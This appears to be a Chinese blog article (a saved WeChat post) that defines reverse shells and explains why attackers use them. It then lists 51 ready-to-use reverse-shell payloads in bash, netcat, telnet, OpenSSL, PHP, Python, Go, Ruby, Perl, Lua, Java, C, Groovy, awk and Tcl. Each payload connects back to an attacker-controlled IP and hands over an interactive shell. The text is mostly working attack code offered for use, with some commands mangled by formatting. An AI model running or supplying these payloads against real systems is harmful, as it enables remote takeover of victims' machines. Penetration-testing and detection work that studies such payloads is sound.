\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/Z4oboZXNHK7hbseEvig4SQ)

什么是反弹 shell？
------------

反弹 shell（reverse shell），就是控制端监听在某 TCP/UDP 端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell 与 telnet，ssh 等标准 shell 对应，本质上是网络概念的客户端与服务端的角色反转。

为什么要反弹 shell？
-------------

通常用于被控端因防火墙受限、权限不足、端口被占用等情形。

举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。那么什么情况下正向连接不能用了呢？

有如下情况：

1\. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。

2\. 目标机器的 ip 动态改变，你不能持续控制。

3\. 由于防火墙等限制，对方机器只能发送请求，不能接收请求。

4\. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。

那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

原生 (以 bash 为例)
--------------

```
#!/bin/bashbash -c '...' 2> /dev/null
```

### tcp

1.

```
#!/bin/bashbash -i >& /dev/tcp/192.168.0.1/65535 0>&1
```

2.

```
#!/bin/bash# 使用域名bash -i >& /dev/tcp/host.domain/65535 0>&1
```

3.

```
#!/bin/bash0<&196;exec 196<>/dev/tcp/192.168.0.1/65535;bash <&196 >&196 2>&196
```

### udp

4.

```
#!/bin/bashbash -i >& /dev/udp/192.168.0.1/65535 0>&1
```

5.

```
#!/bin/bash# 使用域名bash -i >& /dev/udp/host.domain/65535 0>&1
```

6.

```
#!/bin/bash 0<&196;exec 196<>/dev/udp/192.168.0.1/65535;bash <&196 >&196 2>&196
```

工具类
---

### NC

7.

```
#!/bin/bash nc -e /bin/bash 192.168.0.1 65535
```

8.

```
#!/bin/bash /bin/bash | nc 192.168.0.1 65535
```

9.

```
#!/bin/bash nc 192.168.0.1 65535 |/bin/bash
```

10.

```
#!/bin/bash rm -f /tmp/p; mknod /tmp/p p && nc 192.168.0.1 65535 0/tmp/
```

11.

```
#!/bin/bash rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.1 65535 >/tmp/f
```

### NCat

12.

```
#!/bin/bashncat 192.168.1.215 3000 -e /bin/bash
```

### Telnet

13.

```
#!/bin/bashtelnet 192.168.0.1 65534 | /bin/bash | telnet 192.168.0.1 65535
```

14.

```
#!/bin/bashmknod backpipe p && telnet 192.168.0.1 65535 0<backpipe | /bin/bash 1>backpipe
```

### OpenSSL

15.

```
#!/bin/bashmkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1 | openssl s\_client -quiet -connect 192.168.0.1:65535 > /tmp/s; rm /tmp/s
```

### cryptcat

16.

```
#!/bin/bashcryptcat 192.168.0.1 65534 -k sec|cmd.exe|cryptcat 192.168.0.1 65535 -k sec
```

程序类
---

### PHP

```
php -r "..."
```

17.

```
<?phperror\_reporting (E\_ERROR);ignore\_user\_abort(true);ini\_set('max\_execution\_time',0);$os = substr(PHP\_OS,0,3);$ipaddr = '192.168.0.1';$port = '65535';$descriptorspec = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));$cwd = getcwd();$msg = php\_uname() if($os == 'WIN') {    $env = array('path' => 'c:\\\\windows\\\\system32');} else {    $env = array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');}if(function\_exists('fsockopen')) {    $sock = fsockopen($ipaddr,$port);    fwrite($sock,$msg);    while ($cmd = fread($sock,1024)) {        if (substr($cmd,0,3) == 'cd ') {            $cwd = trim(substr($cmd,3,-1));            chdir($cwd);            $cwd = getcwd();        }        if (trim(strtolower($cmd)) == 'exit') {            break;        } else {            $process = proc\_open($cmd,$descriptorspec,$pipes,$cwd,$env);            if (is\_resource($process)) {                fwrite($pipes\[0\],$cmd);                fclose($pipes\[0\]);                $msg = stream\_get\_contents($pipes\[1\]);                fwrite($sock,$msg);                fclose($pipes\[1\]);                $msg = stream\_get\_contents($pipes\[2\]);                fwrite($sock,$msg);                fclose($pipes\[2\]);                proc\_close($process);            }        }    }    fclose($sock);} else {    $sock = socket\_create(AF\_INET,SOCK\_STREAM,SOL\_TCP);    socket\_connect($sock,$ipaddr,$port);    socket\_write($sock,$msg);    fwrite($sock,$msg);    while ($cmd = socket\_read($sock,1024)) {        if (substr($cmd,0,3) == 'cd ') {            $cwd = trim(substr($cmd,3,-1));            chdir($cwd);            $cwd = getcwd();        }        if (trim(strtolower($cmd)) == 'exit') {            break;        } else {            $process = proc\_open($cmd,$descriptorspec,$pipes,$cwd,$env);            if (is\_resource($process)) {                fwrite($pipes\[0\],$cmd);                fclose($pipes\[0\]);                $msg = stream\_get\_contents($pipes\[1\]);                socket\_write($sock,$msg,strlen($msg));                fclose($pipes\[1\]);                $msg = stream\_get\_contents($pipes\[2\]);                socket\_write($sock,$msg,strlen($msg));                fclose($pipes\[2\]);                proc\_close($process);            }        }    }    socket\_close($sock);}?>
```

18.

```
#!/bin/bashphp -r "error\_reporting(E\_ERROR);ignore\_user\_abort(true);ini\_set('max\_execution\_time',0);\\$os=substr(PHP\_OS,0,3);\\$ipaddr='192.168.0.1';\\$port='65535';\\$descriptorspec=array(0=>array(\\"pipe\\",\\"r\\"),1=>array(\\"pipe\\",\\"w\\"),2=>array(\\"pipe\\",\\"w\\"));\\$cwd=getcwd();\\$msg=php\_uname()if(\\$os=='WIN'){\\$env=array('path'=>'c:\\\\windows\\\\system32');}else{\\$env=array('path'=>'/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');}if(function\_exists('fsockopen')){\\$sock=fsockopen(\\$ipaddr,\\$port);fwrite(\\$sock,\\$msg);while(\\$cmd=fread(\\$sock,1024)){if(substr(\\$cmd,0,3)=='cd'){\\$cwd=trim(substr(\\$cmd,3,-1));chdir(\\$cwd);\\$cwd=getcwd();}if(trim(strtolower(\\$cmd))=='exit'){break;}else{\\$process=proc\_open(\\$cmd,\\$descriptorspec,\\$pipes,\\$cwd,\\$env);if(is\_resource(\\$process)){fwrite(\\$pipes\[0\],\\$cmd);fclose(\\$pipes\[0\]);\\$msg=stream\_get\_contents(\\$pipes\[1\]);fwrite(\\$sock,\\$msg);fclose(\\$pipes\[1\]);\\$msg=stream\_get\_contents(\\$pipes\[2\]);fwrite(\\$sock,\\$msg);fclose(\\$pipes\[2\]);proc\_close(\\$process);}}}fclose(\\$sock);}else{\\$sock=socket\_create(AF\_INET,SOCK\_STREAM,SOL\_TCP);socket\_connect(\\$sock,\\$ipaddr,\\$port);socket\_write(\\$sock,\\$msg);fwrite(\\$sock,\\$msg);while(\\$cmd=socket\_read(\\$sock,1024)){if(substr(\\$cmd,0,3)=='cd'){\\$cwd=trim(substr(\\$cmd,3,-1));chdir(\\$cwd);\\$cwd=getcwd();}if(trim(strtolower(\\$cmd))=='exit'){break;}else{\\$process=proc\_open(\\$cmd,\\$descriptorspec,\\$pipes,\\$cwd,\\$env);if(is\_resource(\\$process)){fwrite(\\$pipes\[0\],\\$cmd);fclose(\\$pipes\[0\]);\\$msg=stream\_get\_contents(\\$pipes\[1\]);socket\_write(\\$sock,\\$msg,strlen(\\$msg));fclose(\\$pipes\[1\]);\\$msg=stream\_get\_contents(\\$pipes\[2\]);socket\_write(\\$sock,\\$msg,strlen(\\$msg));fclose(\\$pipes\[2\]);proc\_close(\\$process);}}}socket\_close(\\$sock);}"
```

19.

```
<?php$sock=fsockopen("192.168.0.1"，65535);exec("/bin/bash -i <&3 >&3 2>&3");?>
```

20.

```
#!/bin/bashphp -r "\\$sock=fsockopen(\\"192.168.0.1\\"，65535);exec(\\"/bin/bash -i <&3 >&3 2>&3\\");"
```

21.

```
<?phpexec("/bin/bash -i >& /dev/tcp/192.168.0.1/65535");?>
```

22.

```
#!/bin/bashphp -r "exec(\\"/bin/bash -i >& /dev/tcp/192.168.0.1/65535\\");"
```

### Python

```
#!bin/bashpython -c "..."
```

23.

```
#!/usr/bin/pythonimport socket,subprocess,oss=socket.socket()s.connect(("192.168.0.1",65535))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call(\["/bin/bash","-i"\])
```

24.

```
#!/bin/bashpython -c "import socket,subprocess,os;s=socket.socket();s.connect((\\"192.168.0.1\\",65535));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\[\\"/bin/bash\\",\\"-i\\"\])"
```

25.

```
#!usr/bin/pythonimport sys,socket,os,pty;s=socket.socket()s.connect(("192.168.0.1",65535))for fd in (0,1,2):    os.dup2(s.fileno(),fd)pty.spawn("/bin/bash")
```

26.

```
#!/bin/bashpython -c "import sys,socket,os,pty;s=socket.socket();s.connect((\\"192.168.0.1\\",65535));for fd in (0,1,2):os.dup2(s.fileno(),fd);pty.spawn(\\"/bin/bash\\");"
```

27.

```
#!/usr/bin/pythonimport socket, subprocesss = socket.socket()s.connect(('192.168.0.1',65535))while 1:      proc = subprocess.Popen(s.recv(1024),\\                            shell=True,\\                            stdout=subprocess.PIPE,\\                            stderr=subprocess.PIPE,\\                            stdin=subprocess.PIPE\\                            )    s.send(proc.stdout.read()+proc.stderr.read())
```

28.

```
#!/usr/bin/pythonimport osos.system('bash -i >& /dev/tcp/192.168.0.1/65535 0>&1')
```

### GoLang

```
echo '...' > /tmp/t.go
```

29.

```
package main;import"os/exec";import"net";func main(){    c,\_:=net.Dial("tcp","192.168.0.1:65535");    cmd:=exec.Command("/bin/bash");    cmd.Stdin=c;    cmd.Stdout=c;    cmd.Stderr=c;    cmd.Run()}
```

30.

```
package mainimport(    "log"    "os/exec")func main() {    cmdline := "exec 5<>/dev/tcp/192.168.0.1/65535;cat <&5 | while read line; do $line 2>&5 >&5; done"    cmd := exec.Command("/bin/bash", "-c", cmdline)    bytes, err := cmd.Output()    if err != nil {        log.Println(err)    }    resp := string(bytes)    log.Println(resp)}
```

31.

```
package mainimport (    os/exec)func main(){    cmdline := "bash -i >& /dev/tcp/192.168.0.1/65535 0>&1"    cmd := exec.Command("/bin/bash", "-c", cmdline)
```

32.

```
#!/bin/bashecho 'package main;import"os/exec";import"net";func main(){c,\_:=net.Dial("tcp","192.168.1.215:3000");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### Ruby

```
ruby -rsocket -e '...'
```

33.

```
#!/usr/bin/rubyrequire 'socket'require 'open3'    #Set the Remote Host IPRHOST = "192.168.0.1" #Set the Remote Host PortPORT = "65535"    #Tries to connect every 20 sec until it connects.beginsock = TCPSocket.new "#{RHOST}", "#{PORT}"sock.puts "We are connected!"rescuesleep 20retryend#Runs the commands you type and sends you back the stdout and stderr.beginwhile line = sock.gets    Open3.popen2e("#{line}") do | stdin, stdout\_and\_stderr |            IO.copy\_stream(stdout\_and\_stderr, sock)            end  endrescueretryend
```

34.

```
#!/usr/bin/rubyexit if fork;c=TCPSocket.new("192.168.0.1","65535");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
```

35.

```
#!/usr/bin/rubyexec 'bash -i >& /dev/tcp/192.168.0.1/65535 0>&1'
```

36.

```
#!/bin/bashruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.215","3000");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Perl

```
#!/bin/bashperl -e '...'perl -MIO -e '...'
```

37.

```
#!/usr/bin/perluse Socket;$i="192.168.0.1";$p=65535;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){    open(STDIN,">&S");    open(STDOUT,">&S");    open(STDERR,">&S");    exec("/bin/bash -i");};
```

38.

```
#!/usr/bin/perl$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.1:65535");STDIN->fdopen($c,r);$~->fdopen($c,w);system$\_ while<>;
```

39.

```
#！/usr/bin/perlexec('bash -i >& /dev/tcp/192.168.0.1/65535 0>&1')
```

40.

```
#!/bin/bashperl -e 'use Socket;$i="192.168.1.215";$p=3000;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

41.

```
#!/bin/bashperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.1.215:3000");STDIN->fdopen($c,r);$~->fdopen($c,w);system$\_ while<>;'
```

### Lua

```
lua -e '...'
```

42.

```
#!/usr/bin/lualocal host, port = "192.168.0.1", 65535 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true     do local cmd, status, partial = tcp:receive()     local f = io.popen(cmd, "r")     local s = f:read("\*a")     f:close()    tcp:send(s)     if status == "closed"         then break         end     end tcp:close()
```

43.

```
#!/usr/bin/lualocal socket=require('socket');require('os');t=socket.tcp();t:connect('192.168.0.1','65535');os.execute('/bin/bash -i <&3>&3 2>&3')
```

44.

```
local io = require('io')io.popen('bash -i >& /dev/tcp/192.168.0.1/65535 0>&1')
```

45.

```
#!/bin/bashlua -e "local socket=require('socket');require('os');t=socket.tcp();t:connect('192.168.1.215','3000');os.execute('/bin/sh -i <&3>&3 2>&3');"
```

### Java

```
echo '...' > /tmp/t.java
```

46.

```
public classRevs{    /\*\*    \* @param args    \* @throws Exception     \*/    publicstaticvoidmain(String\[\] args) throws Exception {        // TODO Auto-generated method stub        Runtime r = Runtime.getRuntime();        String cmd\[\]= {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.0.1/65535;cat <&5 | while read line; do $line 2>&5 >&5; done"};        Process p = r.exec(cmd);        p.waitFor();    }}
```

### C

```
echo '...' > /tmp/t.c
```

47.

```
#include <stdio.h>#include <sys/types.h>#include <sys/socket.h>#include <unistd.h>#include <fcntl.h>#include <netinet/in.h>#include <stdio.h>#include <sys/types.h>#include <sys/socket.h>#include <unistd.h>#include <fcntl.h>#include <netinet/in.h>#include <netdb.h>voidusage();char shell\[\]="/bin/bash";char message\[\]="hacker welcome\\n";int sock;intmain(int argc, char \*argv\[\]) {    if(argc <3){    usage(argv\[0\]);    }    struct sockaddr\_in server;    if((sock = socket(AF\_INET, SOCK\_STREAM, 0)) == -1) {    printf("Couldn't make socket!n"); exit(-1);    }    server.sin\_family = AF\_INET;    server.sin\_port = htons(65535);    server.sin\_addr.s\_addr = inet\_addr("192.168.0.1");    if(connect(sock, (struct sockaddr \*)&server, sizeof(struct sockaddr)) == -1) {    printf("Could not connect to remote shell!n");    exit(-1);    }    send(sock, message, sizeof(message), 0);    dup2(sock, 0);    dup2(sock, 1);    dup2(sock, 2);    execl(shell,"/bin/bash",(char \*)0);    close(sock);    return 1;    }    voidusage(char \*prog\[\]) {    printf("Usage: %s <reflect ip> <port>n", prog);    exit(-1);    }
```

48.

```
#include <stdlib.h>    intmain(int argc, char \*argv\[\]){    system(“bash -i >& /dev/tcp/192.168.0.1/65535 0>&1”);    return 0;}
```

### Groovy

```
echo '...' > /tmp/t
```

49.

```
classReverseShell{static void main(String\[\] args) {        String host="192.168.0.1";        int port=65535;        String cmd="/bin/bash";        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();        Socket s=new Socket(host,port);        InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();        OutputStream po=p.getOutputStream(),so=s.getOutputStream();        while(!s.isClosed()){            while(pi.available()>0)                so.write(pi.read());            while(pe.available()>0)                so.write(pe.read());            while(si.available()>0)                po.write(si.read());            so.flush();            po.flush();            Thread.sleep(50);            try {                p.exitValue();                break;                }                catch (Exception e){}            };            p.destroy();            s.close();    }}
```

### awk/gawk

```
#!/bin/bashawk "..."#gawk "..."
```

50.

```
BEGIN{    s="/inet/tcp/0/192.168.0.1/65535";    while(1){        do{            s|&getline c;            if(c){                while((c|&getline)>0)                    print $0|&s;                    close(c)            }        }        while(c!="exit");        close(s)    }}
```

### TCL 脚本

```
echo '...' |tclsh
```

51.

```
set s \[socket 192.168.0.1 65535\];while 42 {    puts -nonewline $s "shell>";    flush $s;    gets $s c;    set e "exec $c";    if {!\[catch {set r \[eval $e\]} err\]} {        puts $s $r         };        flush $s;    };     close $s;
```

![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3bW732RU7NAiaZc4JT6DxmZyUNeZGuxDkFCEEStghYzbBh4Va87vPYuw6llsvJzAmVg3I2f9icYTcKA/640?wx_fmt=png)